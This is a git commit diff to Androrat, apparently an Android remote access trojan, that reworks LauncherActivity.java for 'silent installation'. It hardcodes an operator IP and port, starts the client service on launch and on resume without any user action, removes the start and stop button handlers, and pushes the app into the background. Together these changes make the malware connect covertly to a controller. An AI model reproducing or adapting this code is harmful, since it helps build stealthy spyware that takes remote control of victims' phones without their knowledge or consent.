df977fbd05c2847a1976a2f16a65a5296b93115c
packetforger <packetforger@mail.ru>
2013-08-12 00:04:06 +0000

    Make LauncherActivity.java configured for silent installation

--- src/Androrat/src/my/app/client/LauncherActivity.java
+++ src/Androrat/src/my/app/client/LauncherActivity.java
@@ -2,8 +2,11 @@ package my.app.client;
 
 import my.app.client.R;
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
+import android.os.PowerManager;
+import android.os.PowerManager.WakeLock;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -14,6 +17,47 @@ public class LauncherActivity extends Activity {
 	Intent Client, ClientAlt;
 	Button btnStart, btnStop;
 	EditText ipfield, portfield;
+	String myIp = "192.168.137.248"; //Put your IP in these quotes.
+	int myPort = 9999; //Put your port there, notice that there are no quotes here.
+	
+	@Override
+	public void onStart() {
+		super.onStart();
+		onResume();
+	}
+	
+	@Override
+	public void onResume() {
+		super.onResume();
+		setContentView(R.layout.main);
+
+        Client = new Intent(this, Client.class);
+        Client.setAction(LauncherActivity.class.getName());
+        
+        btnStart = (Button) findViewById(R.id.buttonstart);
+        btnStop = (Button) findViewById(R.id.buttonstop);
+        ipfield = (EditText) findViewById(R.id.ipfield);
+        portfield = (EditText) findViewById(R.id.portfield);
+        
+		if ( myIp == "" ) {
+			ipfield.setText("192.168.137.1");
+			portfield.setText("9999");
+			Client.putExtra("IP", ipfield.getText().toString());
+			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()) );  
+        } else {
+			ipfield.setText(myIp);
+			portfield.setText(String.valueOf(myPort));
+			Client.putExtra("IP", myIp);
+			Client.putExtra("PORT", myPort );  
+		}
+        
+        
+        startService(Client);
+        btnStart.setEnabled(false);
+        btnStop.setEnabled(true);
+        moveTaskToBack(false);
+	}
+	
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -27,24 +71,22 @@ public class LauncherActivity extends Activity {
         ipfield = (EditText) findViewById(R.id.ipfield);
         portfield = (EditText) findViewById(R.id.portfield);
         
-        btnStart.setOnClickListener(new View.OnClickListener() {
-            public void onClick(View view) {
-            	Client.putExtra("IP", ipfield.getText().toString());
-            	Client.putExtra("PORT", new Integer(portfield.getText().toString()));
-                startService(Client);
-                btnStart.setEnabled(false);
-                btnStop.setEnabled(true);
-                //finish();                
-            }
-        });
-
-        btnStop.setOnClickListener(new View.OnClickListener() {
-            public void onClick(View view) {             
-                stopService(Client);  
-                btnStart.setEnabled(true);
-                btnStop.setEnabled(false);
-                //finish(); 
-            }
-        });
+		if ( myIp == "" ) {
+			ipfield.setText("192.168.137.1");
+			portfield.setText("9999");
+			Client.putExtra("IP", ipfield.getText().toString());
+			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()) );  
+        } else {
+			ipfield.setText(myIp);
+			portfield.setText(String.valueOf(myPort));
+			Client.putExtra("IP", myIp);
+			Client.putExtra("PORT", myPort );  
+		}
+        
+        
+        startService(Client);
+        btnStart.setEnabled(false);
+        btnStop.setEnabled(true);
+        //moveTaskToBack(true);
     }
 }
